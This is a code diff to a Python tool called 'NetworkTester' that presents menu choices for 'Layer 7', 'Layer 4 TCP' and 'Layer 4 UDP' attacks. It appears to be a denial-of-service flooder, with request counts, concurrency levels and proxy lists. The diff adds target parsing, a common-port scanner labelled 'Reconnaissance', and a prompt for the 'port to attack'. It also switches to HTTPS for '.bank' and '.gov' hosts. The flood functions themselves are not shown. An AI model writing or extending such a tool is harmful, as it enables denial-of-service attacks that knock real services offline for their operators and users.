@@ -16,8 +16,9 @@ import random
 import sys
 import os
 from urllib.parse import urlparse
-from typing import List, Optional
+from typing import List, Optional, Tuple
 import signal
+import re
 
 # Try to import uvloop for better performance on Unix systems
 try:
@@ -40,6 +41,154 @@ class NetworkTester:
         }
         self.running = True
         self.proxies = []
+        
+    def parse_target(self, target: str) -> Tuple[str, int, str]:
+        """
+        Parse target URL/host and extract host, port, and scheme
+        Returns: (host, port, scheme)
+        """
+        # Clean the input
+        target = target.strip()
+        
+        # If it looks like a URL, parse it
+        if target.startswith(('http://', 'https://', 'ftp://', 'ftps://')):
+            parsed = urlparse(target)
+            host = parsed.hostname
+            port = parsed.port
+            scheme = parsed.scheme
+            
+            # Set default ports based on scheme
+            if port is None:
+                if scheme == 'https':
+                    port = 443
+                elif scheme == 'http':
+                    port = 80
+                elif scheme == 'ftp':
+                    port = 21
+                elif scheme == 'ftps':
+                    port = 990
+                else:
+                    port = 80  # Default fallback
+                    
+            return host, port, scheme
+            
+        # If it contains a port (host:port format)
+        elif ':' in target:
+            parts = target.split(':')
+            if len(parts) == 2:
+                host = parts[0]
+                try:
+                    port = int(parts[1])
+                    return host, port, 'tcp'
+                except ValueError:
+                    # Invalid port, treat as hostname
+                    return target, 80, 'tcp'
+            else:
+                # Multiple colons, might be IPv6
+                return target, 80, 'tcp'
+                
+        # Just a hostname/IP
+        else:
+            return target, 80, 'tcp'
+    
+    def get_common_ports(self) -> dict:
+        """Get dictionary of common services and their ports"""
+        return {
+            'http': 80,
+            'https': 443,
+            'ssh': 22,
+            'ftp': 21,
+            'ftps': 990,
+            'smtp': 25,
+            'pop3': 110,
+            'imap': 143,
+            'dns': 53,
+            'mysql': 3306,
+            'postgresql': 5432,
+            'redis': 6379,
+            'mongodb': 27017,
+            'elasticsearch': 9200,
+            'http-alt': 8080,
+            'https-alt': 8443,
+            'proxy': 3128,
+            'socks': 1080
+        }
+    
+    def suggest_ports(self, host: str) -> List[int]:
+        """Suggest common ports to test based on hostname"""
+        suggestions = []
+        host_lower = host.lower()
+        
+        # Web servers
+        if any(keyword in host_lower for keyword in ['www', 'web', 'site', 'blog', 'shop']):
+            suggestions.extend([80, 443, 8080, 8443])
+        
+        # Database servers
+        elif any(keyword in host_lower for keyword in ['db', 'database', 'mysql', 'postgres', 'mongo']):
+            suggestions.extend([3306, 5432, 27017])
+        
+        # Mail servers
+        elif any(keyword in host_lower for keyword in ['mail', 'smtp', 'pop', 'imap']):
+            suggestions.extend([25, 110, 143, 587, 993, 995])
+        
+        # Default web ports
+        else:
+            suggestions.extend([80, 443])
+            
+        return suggestions
+    
+    def display_target_info(self, host: str, port: int, scheme: str):
+        """Display parsed target information"""
+        print(f"\n🎯 Target Information:")
+        print(f"   Host: {host}")
+        print(f"   Port: {port}")
+        print(f"   Service: {scheme}")
+        
+        # Show what service typically runs on this port
+        common_ports = self.get_common_ports()
+        service_name = None
+        for service, service_port in common_ports.items():
+            if service_port == port:
+                service_name = service
+                break
+                
+        if service_name:
+            print(f"   Common Service: {service_name}")
+        
+        # Test connectivity
+        print(f"   Testing connectivity...")
+        if self.test_connectivity(host, port):
+            print(f"   ✅ Port {port} is open and reachable")
+        else:
+            print(f"   ⚠️ Port {port} appears closed or filtered")
+    
+    def test_connectivity(self, host: str, port: int, timeout: int = 5) -> bool:
+        """Test if a port is open"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            return result == 0
+        except Exception:
+            return False
+    
+    def scan_common_ports(self, host: str, timeout: int = 3) -> List[int]:
+        """Scan common ports and return open ones"""
+        print(f"\n🔍 Scanning common ports on {host}...")
+        
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 8080, 8443]
+        open_ports = []
+        
+        for port in common_ports:
+            if self.test_connectivity(host, port, timeout):
+                open_ports.append(port)
+                print(f"   ✅ Port {port} is open")
+            else:
+                print(f"   ❌ Port {port} is closed", end='\r')
+        
+        print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
+        return open_ports
         
     def load_proxies(self, proxy_file: str) -> List[str]:
         """Load proxies from file"""
@@ -307,14 +456,25 @@ def main():
         print("1. Layer 7 (HTTP/HTTPS)")
         print("2. Layer 4 TCP")
         print("3. Layer 4 UDP")
+        print("4. Port Scanner (Reconnaissance)")
         
-        choice = input("\nEnter your choice (1-3): ").strip()
+        choice = input("\nEnter your choice (1-4): ").strip()
         
         if choice == "1":
             # Layer 7 HTTP Attack
-            url = input("🌐 Enter target URL (e.g., https://example.com): ").strip()
+            url = input("🌐 Enter target URL (e.g., https://example.com or example.com): ").strip()
+            
+            # Auto-format URL if needed
             if not url.startswith(('http://', 'https://')):
-                url = 'http://' + url
+                # Check if it's likely HTTPS
+                if 'secure' in url.lower() or url.endswith('.bank') or url.endswith('.gov'):
+                    url = 'https://' + url
+                else:
+                    url = 'http://' + url
+            
+            # Parse and display target info
+            host, port, scheme = tester.parse_target(url)
+            tester.display_target_info(host, port, scheme)
                 
             num_requests = int(input("📊 Enter number of requests to send: "))
             concurrency = int(input("⚡ Enter concurrency level (parallel connections): "))
@@ -345,13 +505,38 @@ def main():
             
         elif choice == "2":
             # Layer 4 TCP Attack
-            target = input("🎯 Enter target (host:port or just host): ").strip()
-            if ':' in target:
-                host, port = target.split(':', 1)
-                port = int(port)
-            else:
-                host = target
-                port = int(input("🔌 Enter port number: "))
+            target = input("🎯 Enter target (URL, host:port, or just host): ").strip()
+            
+            # Parse target automatically
+            host, port, scheme = tester.parse_target(target)
+            
+            # Display parsed information
+            tester.display_target_info(host, port, scheme)
+            
+            # Ask if user wants to change the port
+            change_port = input(f"\n🔧 Current port is {port}. Change it? (y/n): ").strip().lower()
+            if change_port == 'y':
+                # Show common ports
+                common_ports = tester.get_common_ports()
+                print("\n📋 Common ports:")
+                for service, service_port in list(common_ports.items())[:10]:
+                    print(f"   {service}: {service_port}")
+                
+                new_port = input(f"Enter new port (current: {port}): ").strip()
+                if new_port.isdigit():
+                    port = int(new_port)
+                    print(f"✅ Port changed to {port}")
+            
+            # Option to scan for open ports
+            scan_ports = input("🔍 Scan for open ports first? (y/n): ").strip().lower()
+            if scan_ports == 'y':
+                open_ports = tester.scan_common_ports(host)
+                if open_ports:
+                    print(f"\n🎯 Select a port from open ports: {open_ports}")
+                    selected_port = input(f"Enter port to attack (current: {port}): ").strip()
+                    if selected_port.isdigit() and int(selected_port) in open_ports:
+                        port = int(selected_port)
+                        print(f"✅ Selected port {port}")
                 
             num_connections = int(input("📊 Enter number of connections: "))
             concurrency = int(input("⚡ Enter concurrency level: "))
@@ -362,13 +547,21 @@ def main():
             
         elif choice == "3":
             # Layer 4 UDP Attack
-            target = input("🎯 Enter target (host:port or just host): ").strip()
-            if ':' in target:
-                host, port = target.split(':', 1)
-                port = int(port)
-            else:
-                host = target
-                port = int(input("🔌 Enter port number: "))
+            target = input("🎯 Enter target (URL, host:port, or just host): ").strip()
+            
+            # Parse target automatically
+            host, port, scheme = tester.parse_target(target)
+            
+            # Display parsed information
+            tester.display_target_info(host, port, scheme)
+            
+            # Ask if user wants to change the port
+            change_port = input(f"\n🔧 Current port is {port}. Change it? (y/n): ").strip().lower()
+            if change_port == 'y':
+                new_port = input(f"Enter new port (current: {port}): ").strip()
+                if new_port.isdigit():
+                    port = int(new_port)
+                    print(f"✅ Port changed to {port}")
                 
             num_packets = int(input("📊 Enter number of packets: "))
             concurrency = int(input("⚡ Enter concurrency level: "))
@@ -376,6 +569,44 @@ def main():
             
             # Run Layer 4 UDP attack
             asyncio.run(tester.layer4_udp_attack(host, port, num_packets, concurrency, packet_size))
+            
+        elif choice == "4":
+            # Port Scanner
+            target = input("🎯 Enter target (URL or hostname): ").strip()
+            host, _, _ = tester.parse_target(target)
+            
+            print(f"\n🔍 Port scanning options for {host}:")
+            print("1. Quick scan (common ports)")
+            print("2. Custom port range")
+            print("3. Specific ports")
+            
+            scan_choice = input("Select scan type (1-3): ").strip()
+            
+            if scan_choice == "1":
+                open_ports = tester.scan_common_ports(host)
+            elif scan_choice == "2":
+                start_port = int(input("Enter start port: "))
+                end_port = int(input("Enter end port: "))
+                print(f"\n🔍 Scanning ports {start_port}-{end_port} on {host}...")
+                open_ports = []
+                for port in range(start_port, end_port + 1):
+                    if tester.test_connectivity(host, port, 1):
+                        open_ports.append(port)
+                        print(f"   ✅ Port {port} is open")
+                print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
+            elif scan_choice == "3":
+                ports_input = input("Enter ports separated by commas (e.g., 80,443,22): ")
+                ports = [int(p.strip()) for p in ports_input.split(',') if p.strip().isdigit()]
+                open_ports = []
+                for port in ports:
+                    if tester.test_connectivity(host, port, 3):
+                        open_ports.append(port)
+                        print(f"   ✅ Port {port} is open")
+                    else:
+                        print(f"   ❌ Port {port} is closed")
+                print(f"\n🎯 Found {len(open_ports)} open ports: {open_ports}")
+            
+            return  # Exit after scanning
             
         else:
             print("❌ Invalid choice!")
